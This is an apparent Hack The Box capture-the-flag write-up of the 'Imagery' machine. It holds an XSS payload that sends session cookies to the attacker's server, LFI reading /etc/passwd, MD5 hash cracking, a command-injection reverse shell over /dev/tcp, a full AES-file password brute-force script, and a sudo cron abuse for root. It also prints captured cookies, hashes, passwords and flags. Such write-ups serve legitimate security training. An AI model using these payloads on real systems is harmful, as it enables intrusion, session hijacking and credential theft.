https://app.hackthebox.com/competitive/9/overview

Start with initial Nmap scan

```bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ sudo nmap -sV -sC 10.10.11.88            
[sudo] password for dkvv: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 23:18 IST
Nmap scan report for 10.10.11.88 (10.10.11.88)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
```

Add the hostname imagery.htb to local dns file

Accessing the web page on port 8000 we see a login and register portal.

Create a generic account such as 
Gmail ->  "*Santoshvardan007@gmail.com*"
Password -> "*TeaSeaYeskaHackr*"

Now login to the account

![[Pasted image 20250930233127.png]]

![[Pasted image 20250930233230.png]]
Looks like we can Upload images which means it might be susceptible to Web Upload attacks like LFI

let's uploading an image to see what happens

![[Pasted image 20250930234024.png]]

Looks like we need escalated privileges to carry out any operations apart from uploads

Thanks to supportive HTB community 
We can find an endpoint called "Report a Bug" on bottom of the page

Let's upload a bug with XSS payload to steal the cookie

Huge shoutout to Pro Hacker Perplex_007 for providing me a Burpsuite Pro edition

![[Pasted image 20250930234931.png]]

Intercept the POST request in Burp

![[Pasted image 20250930235029.png]]

Now start a python HTTP server and use the following payload

```Payload
{
  "bugName": "XSS",
  "bugDetails": "<img src=1 onerror=\"document.location='http://10.10.14.206/steal/'+document.cookie\">"
}

```

![[Pasted image 20251001001245.png]]

After few seconds you will receive the cookie

```Bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [01/Oct/2025 00:07:04] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [01/Oct/2025 00:07:04] code 404, message File not found
127.0.0.1 - - [01/Oct/2025 00:07:04] "GET /favicon.ico HTTP/1.1" 404 -
10.10.11.88 - - [01/Oct/2025 00:12:10] code 404, message File not found
10.10.11.88 - - [01/Oct/2025 00:12:10] "GET /steal/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNwkgA.r9RdnCxwk3FqK_JFzvlvvx4XGvc HTTP/1.1" 404 -
10.10.11.88 - - [01/Oct/2025 00:12:11] code 404, message File not found
10.10.11.88 - - [01/Oct/2025 00:12:11] "GET /favicon.ico HTTP/1.1" 404 -
10.10.11.88 - - [01/Oct/2025 00:13:09] code 404, message File not found
10.10.11.88 - - [01/Oct/2025 00:13:09] "GET /steal/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNwkuw.3FbR_XtHpenR_mpfUdPMwHnz0rQ HTTP/1.1" 404 -
10.10.11.88 - - [01/Oct/2025 00:13:09] code 404, message File not found
10.10.11.88 - - [01/Oct/2025 00:13:09] "GET /favicon.ico HTTP/1.1" 404 -

```

Now use developers tools and paste this cookie value in storage and refresh the page
![[Pasted image 20251001001621.png]]

Once you do that you will become privileged user with access to Admin Panel
![[Pasted image 20251001004730.png]]

In the panel we can see a couple of users and some submitted bug reports

Thanks to the supportive HTB community again 

Here we need to intercept the download log request in BURP and perform LFI

So let's intercept the request in Burp now

![[Pasted image 20251001005128.png]]

Now let's perform LFI

![[Pasted image 20251001010013.png]]

We made an interesting discoveries

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Tue, 30 Sep 2025 19:29:40 GMT
Content-Disposition: attachment; filename=passwd
Content-Type: text/plain; charset=utf-8
Content-Length: 1982
Last-Modified: Mon, 22 Sep 2025 19:11:49 GMT
Cache-Control: no-cache
ETag: "1758568309.7066295-1982-2448691187"
Date: Tue, 30 Sep 2025 19:29:40 GMT
Vary: Cookie
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

We identified a user with name "Mark" and "Web"

Lets check out the "Web"
![[Pasted image 20251001010445.png]]
![[Pasted image 20251001010352.png]]

We got two hashes

```text
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
```

I performed brute forcing on both hashes and was able to crack only one hash belonging to "testuser"

```Bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ cat > hashes.txt <<EOF                                                      
5d9c1d507a3f76af1e5c97a3ad1eaa31
2c65c8d7bfbca32a3ed42596192384f6
EOF


┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=20
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-10-01 01:09) 0g/s 29881Kp/s 29881Kc/s 29881KC/s  fuckyooh21..*7¡Vamos!
Session completed. 

┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ john --show --format=raw-md5 hashes.txt                                     
?:iambatman

1 password hash cracked, 1 left

```

Now lets login with these credentials 
email -> testuser@imagery.htb
password -> iambatman

Once logged in, Head over to Uploads section and re-upload any image,

![[Pasted image 20251001011405.png]]

It seems like we can perform other actions with this account which we couldn't do earlier on

![[Pasted image 20251001011450.png]]

Now select Transform Image -> Select Operation as "Crop"

![[Pasted image 20251001011612.png]]

Then intercept this request in Burp

![[Pasted image 20251001033542.png]]

Update this field with following Reverse Shell

```Bash
{ "imageId":"3b7868b6-6d25-48ad-bf0e-8c1942f98ddc", "transformType": "crop", "params": { "x": ";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/<tun0 Ip>/<Preffered port no> 0>&1\";", "y": 0, "width": 640, "height": 640 } }
```

Start a listener shell and update the params as following 

![[Pasted image 20251001033620.png]]

Send the request and you'll get the following reverse shell

![[Pasted image 20251001012622.png]]

Download linpeas and send it to the reverse shell

![[Pasted image 20251001014202.png]]

![[Pasted image 20251001014528.png]]

linpeas Catch The file /var/backup/web_20250806_120723.zip.aes is an encrypted backup archive owned by root ; however its permissions make it world-readable, so we (or any user) can read/download it

```Bash
web@Imagery:~/web$ cd /var/backup
cd /var/backup
web@Imagery:/var/backup$ ls
ls
web_20250806_120723.zip.aes
web@Imagery:/var/backup$ 
```

Transfer the `.zip.aes` file to attacker machine

![[Pasted image 20251001022256.png]]

Download python library pyAesCrypt and use the following custom script to brute force the password

bf_pyaescrypt_multi.py

```python
#!/usr/bin/env python3
"""
Brute-force wrapper für pyAesCrypt.decryptFile()
Unterstützt Wordlists und multiprocessing.
4-spaces indentation wie gewünscht.
"""
import argparse
import multiprocessing as mp
import tempfile
import os
import sys
from os.path import isfile
import pyAesCrypt

BUFFER_SIZE = 64 * 1024  # Übereinstimmung mit pyAesCrypt default


def _try_decrypt_worker(args):
    """
    Worker-Funktion, aufgerufen im eigenen Prozess.
    Versuch: pyAesCrypt.decryptFile(infile, tmpfile, password, BUFFER_SIZE)
    Bei Erfolg: return (lineno, password, tmpname)
    Bei Fehlschlag: return None
    """
    lineno, pw, infile = args
    # Erstelle temporäre Zieldatei
    fd, tmpname = tempfile.mkstemp(prefix="pyaesbf_", suffix=".tmp")
    os.close(fd)
    try:
        # pyAesCrypt wirft ValueError bei falschem PW
        pyAesCrypt.decryptFile(infile, tmpname, pw, BUFFER_SIZE)
        # Wenn kein Exception, dann erfolgreich
        return (lineno, pw, tmpname)
    except ValueError:
        # falsches Passwort / integritätscheck fehlgeschlagen
        try:
            os.remove(tmpname)
        except Exception:
            pass
        return None
    except IOError as e:
        # echtes IO-Problem -> entferne tmp und gib Fehler weiter
        try:
            os.remove(tmpname)
        except Exception:
            pass
        # Wir geben die Exception zurück, damit der Master das erkennt
        return ("__IOERR__", str(e))
    except Exception as e:
        # Sonstige Fehler -> entferne tmp
        try:
            os.remove(tmpname)
        except Exception:
            pass
        return ("__ERR__", str(e))


def pw_generator(wordlist_path, start=0):
    """
    Liefert (lineno, password) Paare aus der Wortliste.
    Liest im Binary-Modus und decodiert Zeilen robust.
    """
    with open(wordlist_path, "rb") as f:
        for lineno, raw in enumerate(f):
            if lineno < start:
                continue
            pwb = raw.rstrip(b"\r\n")
            if not pwb:
                continue
            # versuchen utf-8, fallback latin-1
            try:
                pw = pwb.decode("utf-8")
            except UnicodeDecodeError:
                pw = pwb.decode("latin-1", "ignore")
            yield (lineno, pw)


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Brute-force decrypt AES Crypt v2 files with pyAesCrypt "
            "(wordlist + multiprocessing)"
        )
    )
    parser.add_argument("infile", help="Input .aes file")
    parser.add_argument(
        "wordlist", help="Wordlist (z. B. /usr/share/wordlists/rockyou.txt)"
    )
    parser.add_argument(
        "-o",
        "--out",
        help="Output filename (defaults to infile without .aes)",
    )
    parser.add_argument(
        "-j",
        "--jobs",
        type=int,
        default=4,
        help="Number of worker processes (default: 4)",
    )
    parser.add_argument(
        "-s",
        "--start",
        type=int,
        default=0,
        help="Skip first N lines of the wordlist (resume)",
    )
    args = parser.parse_args()

    # Basic checks
    if not isfile(args.infile):
        print("Error: input file not found:", args.infile, file=sys.stderr)
        sys.exit(1)
    if not isfile(args.wordlist):
        print("Error: wordlist not found:", args.wordlist, file=sys.stderr)
        sys.exit(1)
    if args.out:
        outname = args.out
    elif args.infile.endswith(".aes"):
        outname = args.infile[:-4]
    else:
        print(
            'Error: please provide -o when input file does not end with ".aes"',
            file=sys.stderr,
        )
        sys.exit(1)

    print(
        f"Starting brute-force: infile={args.infile} wordlist={args.wordlist} "
        f"jobs={args.jobs} start={args.start}"
    )
    print("Only run this on files you are authorized to test!")

    # Erzeuge Generator mit (lineno, pw)
    gen = pw_generator(args.wordlist, start=args.start)

    # Pool starten
    pool = mp.Pool(processes=max(1, args.jobs))
    try:
        # Wir erzeugen einen Iterator von Argument-Tuples (lineno, pw, infile)
        def arg_iter():
            for lineno, pw in gen:
                yield (lineno, pw, args.infile)

        # imap_unordered gibt Ergebnisse zurück, sobald Worker fertig sind
        result_iter = pool.imap_unordered(_try_decrypt_worker, arg_iter(), chunksize=1)
        for res in result_iter:
            # falls Worker ein Fehlerobjekt zurückgibt:
            if res is None:
                # falsches Passwort — weiter
                continue
            if isinstance(res, tuple) and res and res[0] == "__IOERR__":
                # IO Error im Worker: brechen ab
                print("IOError im Worker:", res[1], file=sys.stderr)
                pool.terminate()
                pool.join()
                sys.exit(1)
            if isinstance(res, tuple) and res and res[0] == "__ERR__":
                print("Worker error:", res[1], file=sys.stderr)
                pool.terminate()
                pool.join()
                sys.exit(1)

            # erfolgreicher Entschlüsselungsversuch: (lineno, pw, tmpname)
            lineno, pw, tmpname = res
            print("\n*** SUCCESS ***")
            print("Line:", lineno)
            print("Password:", pw)
            # Verschiebe temporäre Datei an Ziel (überschreibt wenn nötig)
            try:
                os.replace(tmpname, outname)
                print("Decrypted file saved as:", outname)
            except Exception as e:
                print("Fehler beim Verschieben der Ausgabedatei:", e, file=sys.stderr)
                # tmpname belassen für Debug
            # Pool beenden
            pool.terminate()
            pool.join()
            return

        # Wenn wir hier ankommen: keine Passwörter haben funktioniert
        print("Finished wordlist — no password found.")
    except KeyboardInterrupt:
        print("\nAbgebrochen durch Benutzer.")
        pool.terminate()
        pool.join()
        sys.exit(1)
    finally:
        try:
            pool.close()
        except Exception:
            pass
        try:
            pool.join()
        except Exception:
            pass


if __name__ == "__main__":
    main()
```

Then you get the password the following password

```Bash
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ python3 bf_pyaescrypt_multi.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt -o web_20250806_120723.zip -j 1

Starting brute-force: infile=web_20250806_120723.zip.aes wordlist=/usr/share/wordlists/rockyou.txt jobs=1 start=0
Only run this on files you are authorized to test!

*** SUCCESS ***
Line: 669
Password: bestfriends
Fehler beim Verschieben der Ausgabedatei: [Errno 18] Invalid cross-device link: '/tmp/pyaesbf_7j_gu0tm.tmp' -> 'web_20250806_120723.zip'
               
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ ls
bf_pyaescrypt_multi.py                                                 hashes.txt  linpeas.sh  pyAesCrypt  web_20250806_120723.zip.aes

┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ python3 pyAesCrypt -d web_20250806_120723.zip.aes
Password:
                                                               
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Imagery]
└─$ ls
bf_pyaescrypt_multi.py                                                 hashes.txt  web_20250806_120723.zip.aes pyAesCrypt  web_20250806_120723.zip

```

Once you decrypt the aes file with password you can find the zip file

Unzip the zip file

![[Pasted image 20251001030030.png]]

Check out the db.json file again 
```bash
┌──(dkvv㉿OMEN)-[~/…/HTB/Machines/Imagery/web]
└─$ cat db.json           
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
} 
```

We can see the password hash of user `Mark`

Let's decrypt the hash

![[Pasted image 20251001030328.png]]

We got the password.

Now using the credentials we can switch the user to mark in reverse shell

![[Pasted image 20251001031336.png]]

Get the user flag in home directory of current user

```Bash
cd /home/mark
ls
user.txt
cat user.txt
f4c7df4874e423f2a20b0dfa4382b4b0
```

Now for the privilege escalation 

```Bash
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Looks like we going to use Charcoal shell

First open an interactive charcoal shell using sudo

Since we require a passphrase which we don't have, we can reset application passsword to default using -R flag as we see it in help menu

![[Pasted image 20251001031821.png]]

I have reset the password to same password as mark

![[Pasted image 20251001031958.png]]

Now let's restart the shell again and I'm continuing with no password option 

![[Pasted image 20251001032138.png]]

Now add a Cron job that is scheduled to run every minute that copies `/root/root.txt` to `/tmp/root.txt` and makes it world‑readable.

![[Pasted image 20251001035008.png]]

```bash
auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/root.txt && chmod 777
/tmp/root.txt" --name "get_flag"
```

Then exit the shell and check out the tmp file for Root flag

```bash
mark@Imagery:/tmp$ cd /home/mark
cd /home/mark
mark@Imagery:~$ cat /tmp/root.txt
cat /tmp/root.txt
8dc8455c767c807ee3543cf0197a2020
```

![[Pasted image 20251001035620.png]]

